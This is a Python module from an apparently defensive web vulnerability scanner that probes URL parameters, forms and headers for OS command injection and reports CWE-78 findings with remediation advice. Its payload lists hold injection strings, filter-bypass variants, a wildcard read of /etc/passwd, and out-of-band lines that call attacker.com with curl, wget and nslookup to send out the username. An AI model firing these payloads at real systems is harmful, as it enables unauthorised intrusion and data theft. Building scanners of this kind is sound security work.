"""Command Injection Scanner Module for detecting OS command injection vulnerabilities."""

import asyncio
import httpx
import re
import time
from typing import Dict, List, Any, Optional
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from ..base_module import (
    BaseScannerModule,
    ScanConfig,
    ScanResult,
    Vulnerability,
    SeverityLevel,
    ScanType
)

class CommandInjectionScanner(BaseScannerModule):
    """Command Injection vulnerability scanner."""
    
    def __init__(self):
        super().__init__()
        self.name = "CommandInjectionScanner"
        self.description = "Detects OS command injection vulnerabilities"
        self.scan_type = ScanType.ACTIVE
        
        # Command injection payloads for different OS
        self.payloads = {
            'basic': [
                # Basic command injection
                '; id',
                '| id',
                '|| id',
                '& id',
                '&& id',
                
                # Command substitution
                '$(id)',
                '`id`',
                
                # Newline injection
                '\n id',
                '\r\n id',
                
                # Windows commands
                '& whoami',
                '| whoami',
                '|| whoami',
                
                # Path traversal with command
                '../../../bin/id',
                '..\\..\\..\\windows\\system32\\whoami.exe',
            ],
            
            'time_based': [
                # Linux/Unix time-based
                '; sleep 5',
                '| sleep 5',
                '|| sleep 5',
                '& sleep 5',
                '&& sleep 5',
                '$(sleep 5)',
                '`sleep 5`',
                
                # Windows time-based
                '& ping -n 6 127.0.0.1',
                '| ping -n 6 127.0.0.1',
                '|| ping -n 6 127.0.0.1',
                
                # PowerShell
                '; Start-Sleep -s 5',
                '& Start-Sleep -s 5',
            ],
            
            'blind': [
                # DNS exfiltration (requires DNS monitoring)
                '; nslookup $(whoami).attacker.com',
                '| nslookup $(whoami).attacker.com',
                
                # Out-of-band HTTP
                '; curl http://attacker.com/$(whoami)',
                '| wget http://attacker.com/$(whoami)',
                
                # File creation test
                '; touch /tmp/cmdinj_test',
                '& echo test > C:\\temp\\cmdinj_test.txt',
            ],
            
            'encoded': [
                # URL encoded
                '%3B%20id',
                '%7C%20id',
                '%26%20whoami',
                
                # Double URL encoded
                '%253B%2520id',
                '%257C%2520id',
                
                # Unicode encoded
                '\u003b\u0020id',
                '\u007c\u0020id',
            ],
            
            'bypass': [
                # Space bypass
                ';${IFS}id',
                '|${IFS}id',
                ';$IFS$9id',
                
                # Quote bypass
                ';i""d',
                "|i''d",
                
                # Concatenation
                ';i\\d',
                '|wh\\oami',
                
                # Variable expansion
                ';${PATH:0:1}bin${PATH:0:1}id',
                
                # Command separator variations
                '%0Aid',
                '%0Did',
                
                # Backtick variations
                '`id`',
                '$(id)',
                
                # Wildcard bypass
                ';/???/??t /etc/passwd',
                '|/???/??t /etc/passwd',
            ]
        }
        
        # Patterns indicating successful command injection
        self.success_patterns = {
            'linux': [
                # User identification
                r'uid=\d+\([^)]+\)',
                r'gid=\d+\([^)]+\)',
                r'groups=\d+\([^)]+\)',
                
                # System information
                r'Linux\s+\S+\s+\d+\.\d+',
                r'/bin/bash',
                r'/bin/sh',
                
                # File content indicators
                r'root:x:0:0:',  # /etc/passwd
                r'daemon:x:\d+:\d+:',
                
                # Process information
                r'PID\s+TTY\s+TIME\s+CMD',
                r'\d+\s+pts/\d+',
            ],
            
            'windows': [
                # User identification
                r'[A-Z]+\\[A-Za-z0-9]+',  # DOMAIN\username
                r'NT AUTHORITY\\',
                r'BUILTIN\\',
                
                # System information
                r'Windows\s+\[Version\s+\d+\.\d+',
                r'Microsoft Windows',
                
                # Command output
                r'Volume in drive',
                r'Directory of',
                
                # Network information
                r'IPv4 Address',
                r'Default Gateway',
            ],
            
            'general': [
                # Error messages that might indicate injection
                r'sh:\s+\d+:\s+',  # Shell error
                r'bash:\s+',
                r'command not found',
                r'is not recognized as an internal or external command',
                r'Permission denied',
                r'Access is denied',
            ]
        }
        
        # Common vulnerable parameters
        self.common_params = [
            'cmd', 'exec', 'command', 'execute',
            'ping', 'host', 'hostname', 'ip',
            'file', 'filename', 'path', 'dir',
            'url', 'uri', 'src', 'dest',
            'user', 'username', 'name',
            'search', 'query', 'q',
            'data', 'input', 'arg',
            'process', 'proc', 'pid',
            'action', 'do', 'act',
        ]
    
    def validate_target(self, target: str) -> bool:
        """Validate if target is suitable for command injection testing."""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        try:
            parsed = urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except:
            return False
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Perform command injection scan."""
        started_at = datetime.utcnow()
        vulnerabilities = []
        errors = []
        warnings = []
        info = {
            'tested_parameters': [],
            'vulnerable_parameters': [],
            'injection_types': [],
            'os_detected': None,
        }
        statistics = {
            'urls_tested': 0,
            'parameters_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'time_based_found': 0,
            'blind_found': 0,
        }
        
        try:
            # Ensure URL has scheme
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            if config.scan_type == ScanType.PASSIVE:
                # Passive detection only
                passive_vulns = await self._passive_detection(target_url)
                vulnerabilities.extend(passive_vulns)
            else:
                # Active command injection testing
                
                # 1. Test URL parameters
                param_results = await self._test_url_parameters(target_url, config)
                vulnerabilities.extend(param_results['vulnerabilities'])
                info['tested_parameters'].extend(param_results['tested_params'])
                
                # 2. Test forms
                form_results = await self._test_forms(target_url, config)
                vulnerabilities.extend(form_results)
                
                # 3. Test headers
                header_results = await self._test_headers(target_url, config)
                vulnerabilities.extend(header_results)
                
                # 4. Time-based detection
                if config.scan_type == ScanType.AGGRESSIVE:
                    time_results = await self._test_time_based(target_url, config)
                    vulnerabilities.extend(time_results)
                    statistics['time_based_found'] = len(time_results)
                
                # 5. Test file upload endpoints
                upload_results = await self._test_file_uploads(target_url, config)
                vulnerabilities.extend(upload_results)
            
            # Update statistics
            statistics['vulnerabilities_found'] = len(vulnerabilities)
            statistics['parameters_tested'] = len(info['tested_parameters'])
            statistics['urls_tested'] = 1
            
            # Determine injection types found
            injection_types = set()
            for vuln in vulnerabilities:
                if 'time-based' in vuln.name.lower():
                    injection_types.add('Time-based')
                elif 'blind' in vuln.name.lower():
                    injection_types.add('Blind')
                else:
                    injection_types.add('Direct')
            info['injection_types'] = list(injection_types)
            
            # Extract vulnerable parameters
            for vuln in vulnerabilities:
                if 'parameter' in vuln.evidence:
                    info['vulnerable_parameters'].append(vuln.evidence['parameter'])
            
            # Detect OS if possible
            for vuln in vulnerabilities:
                if 'os_type' in vuln.evidence:
                    info['os_detected'] = vuln.evidence['os_type']
                    break
            
        except Exception as e:
            errors.append(f"Command injection scan failed: {str(e)}")
        
        completed_at = datetime.utcnow()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=completed_at,
            vulnerabilities=vulnerabilities,
            errors=errors,
            warnings=warnings,
            info=info,
            statistics=statistics
        )
    
    async def _passive_detection(self, url: str) -> List[Vulnerability]:
        """Passive detection of potential command injection points."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False) as client:
                response = await client.get(url)
                
                # Check for command execution functions in JavaScript
                dangerous_patterns = [
                    r'exec\s*\(',
                    r'system\s*\(',
                    r'shell_exec\s*\(',
                    r'passthru\s*\(',
                    r'eval\s*\(',
                    r'popen\s*\(',
                    r'proc_open\s*\(',
                    r'Runtime\.getRuntime\(\)\.exec',
                    r'ProcessBuilder',
                ]
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerabilities.append(
                            Vulnerability(
                                module=self.name,
                                name="Potential Command Execution Function Exposed",
                                description=f"Found potential command execution function: {pattern}",
                                severity=SeverityLevel.MEDIUM,
                                confidence=0.4,
                                affected_urls=[url],
                                remediation="Review and secure command execution functions",
                                cwe_ids=["CWE-78"]
                            )
                        )
                        break
                
                # Check for shell command patterns in responses
                shell_patterns = [
                    r'sh -c',
                    r'bash -c',
                    r'cmd\.exe /c',
                    r'powershell\.exe',
                ]
                
                for pattern in shell_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerabilities.append(
                            Vulnerability(
                                module=self.name,
                                name="Shell Command Pattern Detected",
                                description=f"Found shell command pattern: {pattern}",
                                severity=SeverityLevel.LOW,
                                confidence=0.3,
                                affected_urls=[url],
                                remediation="Ensure shell commands are properly sanitized",
                                cwe_ids=["CWE-78"]
                            )
                        )
                        break
                        
        except:
            pass
        
        return vulnerabilities
    
    async def _test_url_parameters(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Test URL parameters for command injection."""
        vulnerabilities = []
        tested_params = []
        
        # Parse URL for parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Try common parameter names
            params = {param: ['test'] for param in self.common_params[:5]}
        
        # Select payloads based on scan type
        if config.scan_type == ScanType.ACTIVE:
            payloads = self.payloads['basic'][:5]
        elif config.scan_type == ScanType.AGGRESSIVE:
            payloads = self.payloads['basic'] + self.payloads['bypass']
        else:
            payloads = self.payloads['basic'][:3]
        
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            # Get baseline response
            baseline_response = await client.get(url)
            baseline_length = len(baseline_response.text)
            
            for param_name, param_values in params.items():
                tested_params.append(param_name)
                original_value = param_values[0] if param_values else 'test'
                
                for payload in payloads:
                    # Test with payload
                    test_params = params.copy()
                    test_params[param_name] = [original_value + payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        response = await client.get(test_url)
                        
                        # Check for command execution indicators
                        os_type = None
                        confidence = 0.0
                        
                        # Check Linux patterns
                        for pattern in self.success_patterns['linux']:
                            if re.search(pattern, response.text):
                                os_type = 'Linux'
                                confidence = 0.95
                                break
                        
                        # Check Windows patterns
                        if not os_type:
                            for pattern in self.success_patterns['windows']:
                                if re.search(pattern, response.text):
                                    os_type = 'Windows'
                                    confidence = 0.95
                                    break
                        
                        # Check general patterns
                        if not os_type:
                            for pattern in self.success_patterns['general']:
                                if re.search(pattern, response.text):
                                    os_type = 'Unknown'
                                    confidence = 0.7
                                    break
                        
                        if os_type:
                            vulnerabilities.append(
                                Vulnerability(
                                    module=self.name,
                                    name=f"Command Injection in parameter '{param_name}'",
                                    description=f"Parameter '{param_name}' is vulnerable to OS command injection",
                                    severity=SeverityLevel.CRITICAL,
                                    confidence=confidence,
                                    affected_urls=[url],
                                    evidence={
                                        'parameter': param_name,
                                        'payload': payload,
                                        'os_type': os_type,
                                    },
                                    remediation="Never pass user input directly to system commands. Use parameterized commands or whitelist validation.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/Command_Injection",
                                        "https://cwe.mitre.org/data/definitions/78.html"
                                    ],
                                    cwe_ids=["CWE-78"]
                                )
                            )
                            break
                        
                        # Check for significant response changes
                        if abs(len(response.text) - baseline_length) > 500:
                            vulnerabilities.append(
                                Vulnerability(
                                    module=self.name,
                                    name=f"Potential Command Injection in '{param_name}'",
                                    description=f"Parameter '{param_name}' shows significant response change with command injection payload",
                                    severity=SeverityLevel.MEDIUM,
                                    confidence=0.5,
                                    affected_urls=[url],
                                    evidence={
                                        'parameter': param_name,
                                        'payload': payload,
                                        'response_diff': abs(len(response.text) - baseline_length),
                                    },
                                    remediation="Investigate and secure command execution in this parameter.",
                                    cwe_ids=["CWE-78"]
                                )
                            )
                            
                    except:
                        pass
        
        return {
            'vulnerabilities': vulnerabilities,
            'tested_params': tested_params
        }
    
    async def _test_forms(self, url: str, config: ScanConfig) -> List[Vulnerability]:
        """Test forms for command injection vulnerabilities."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False) as client:
                response = await client.get(url)
                
                # Find forms
                form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
                forms = form_pattern.findall(response.text)
                
                for form_html in forms[:3]:  # Test up to 3 forms
                    # Extract form details
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
                    action = action_match.group(1) if action_match else url
                    
                    if not action.startswith(('http://', 'https://')):
                        from urllib.parse import urljoin
                        action = urljoin(url, action)
                    
                    # Extract input fields
                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
                    inputs = input_pattern.findall(form_html)
                    
                    # Test each input
                    for input_name in inputs:
                        # Skip certain field types
                        if input_name.lower() in ['csrf', 'token', 'captcha', 'password', 'submit']:
                            continue
                        
                        # Test with basic command injection payload
                        payload = '; id'
                        form_data = {input_name: f"test{payload}"}
                        
                        # Add other fields with default values
                        for other_input in inputs:
                            if other_input != input_name and other_input not in form_data:
                                form_data[other_input] = 'test'
                        
                        try:
                            # Determine method
                            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                            method = method_match.group(1).upper() if method_match else 'POST'
                            
                            if method == 'POST':
                                test_response = await client.post(action, data=form_data)
                            else:
                                test_response = await client.get(action, params=form_data)
                            
                            # Check for command execution
                            for pattern in self.success_patterns['linux'] + self.success_patterns['windows']:
                                if re.search(pattern, test_response.text):
                                    vulnerabilities.append(
                                        Vulnerability(
                                            module=self.name,
                                            name=f"Command Injection in form field '{input_name}'",
                                            description=f"Form field '{input_name}' is vulnerable to command injection",
                                            severity=SeverityLevel.CRITICAL,
                                            confidence=0.9,
                                            affected_urls=[action],
                                            evidence={
                                                'form_action': action,
                                                'field': input_name,
                                                'method': method,
                                                'payload': payload,
                                            },
                                            remediation="Sanitize all form inputs before passing to system commands.",
                                            cwe_ids=["CWE-78"]
                                        )
                                    )
                                    break
                                    
                        except:
                            pass
                            
        except:
            pass
        
        return vulnerabilities
    
    async def _test_headers(self, url: str, config: ScanConfig) -> List[Vulnerability]:
        """Test HTTP headers for command injection."""
        vulnerabilities = []
        
        # Headers to test
        test_headers = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Original-URL',
            'X-Rewrite-URL',
            'Cookie',
        ]
        
        payloads = ['; id', '| whoami', '$(id)']
        
        async with httpx.AsyncClient(verify=False) as client:
            for header in test_headers:
                for payload in payloads:
                    headers = {header: f"test{payload}"}
                    
                    try:
                        response = await client.get(url, headers=headers)
                        
                        # Check for command execution
                        for pattern in self.success_patterns['linux'] + self.success_patterns['windows']:
                            if re.search(pattern, response.text):
                                vulnerabilities.append(
                                    Vulnerability(
                                        module=self.name,
                                        name=f"Command Injection via {header} header",
                                        description=f"HTTP header '{header}' is vulnerable to command injection",
                                        severity=SeverityLevel.HIGH,
                                        confidence=0.85,
                                        affected_urls=[url],
                                        evidence={
                                            'header': header,
                                            'payload': payload,
                                        },
                                        remediation="Never trust HTTP headers. Sanitize all header values before processing.",
                                        cwe_ids=["CWE-78"]
                                    )
                                )
                                break
                                
                    except:
                        pass
        
        return vulnerabilities
    
    async def _test_time_based(self, url: str, config: ScanConfig) -> List[Vulnerability]:
        """Test for time-based command injection."""
        vulnerabilities = []
        
        # Parse URL for parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query) or {param: ['test'] for param in self.common_params[:3]}
        
        async with httpx.AsyncClient(verify=False) as client:
            for param_name in params:
                for payload in self.payloads['time_based'][:3]:
                    test_params = params.copy()
                    test_params[param_name] = [params[param_name][0] + payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        start_time = time.time()
                        response = await client.get(test_url, timeout=10)
                        elapsed = time.time() - start_time
                        
                        # If response took more than 4 seconds, likely vulnerable
                        if elapsed > 4:
                            vulnerabilities.append(
                                Vulnerability(
                                    module=self.name,
                                    name=f"Time-based Command Injection in '{param_name}'",
                                    description=f"Parameter '{param_name}' is vulnerable to time-based command injection",
                                    severity=SeverityLevel.HIGH,
                                    confidence=0.8,
                                    affected_urls=[url],
                                    evidence={
                                        'parameter': param_name,
                                        'payload': payload,
                                        'delay_observed': elapsed,
                                    },
                                    remediation="Implement proper input validation and avoid passing user input to system commands.",
                                    cwe_ids=["CWE-78"]
                                )
                            )
                            break
                            
                    except asyncio.TimeoutError:
                        # Timeout might indicate successful sleep command
                        pass
                    except:
                        pass
        
        return vulnerabilities
    
    async def _test_file_uploads(self, url: str, config: ScanConfig) -> List[Vulnerability]:
        """Test file upload endpoints for command injection."""
        vulnerabilities = []
        
        # This is a basic check - real file upload testing would require more complex logic
        try:
            async with httpx.AsyncClient(verify=False) as client:
                response = await client.get(url)
                
                # Look for file upload forms
                if 'type="file"' in response.text or 'multipart/form-data' in response.text:
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name="File Upload Endpoint Detected",
                            description="File upload functionality detected - potential command injection vector",
                            severity=SeverityLevel.LOW,
                            confidence=0.3,
                            affected_urls=[url],
                            remediation="Ensure uploaded files are properly validated and never executed directly.",
                            cwe_ids=["CWE-78", "CWE-434"]
                        )
                    )
                    
        except:
            pass
        
        return vulnerabilities
